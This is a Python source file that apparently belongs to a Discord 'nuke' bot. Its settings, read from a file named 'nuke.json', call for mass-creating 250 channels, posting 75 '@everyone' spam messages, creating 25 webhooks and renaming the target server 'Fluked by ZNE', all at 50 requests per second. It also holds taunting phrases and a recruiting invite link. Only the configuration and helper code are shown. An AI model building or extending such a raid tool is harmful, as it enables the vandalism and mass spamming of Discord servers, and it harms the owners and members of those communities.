from __future__ import annotations
import json
import random
import discord
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import List, Optional


def now(seconds: int = 0, days: int = 0) -> datetime:
    return discord.utils.utcnow() + timedelta(seconds=seconds, days=days)


class _MISSING:
    def __repr__(self):
        return "MISSING"


MISSING = _MISSING()


class State:
    _phrases = [
        "ZNE ON TOP",
        "FLUKED BY ZNE",
        "https://discord.gg/Y6qZ4TKRM5",
        "GET OBLITERATED",
    ]

    @classmethod
    def get_phrase(cls) -> str:
        return random.choice(cls._phrases)


@dataclass
class Settings:
    channel_count: int = 250
    channel_names: List[str] = field(default_factory=lambda: [
        "fluk-on-top",
        "zne-was-here",
        "https://discord.gg/Y6qZ4TKRM5",
    ])
    spam_message: str = "@everyone https://discord.gg/Y6qZ4TKRM5 | ZNE ON TOP"
    spam_count: int = 75
    webhook_name: str = "ZNE Fluk"
    webhook_message: str = "@everyone https://discord.gg/Y6qZ4TKRM5 | join zne now"
    webhook_count: int = 25
    server_name: str = "Fluked by ZNE"
    requests_per_second: int = 50

    @classmethod
    def load(cls, path: str = "nuke.json") -> "Settings":
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            return cls(**{k: v for k, v in data.items() if k in cls.__annotations__})
        except FileNotFoundError:
            return cls()
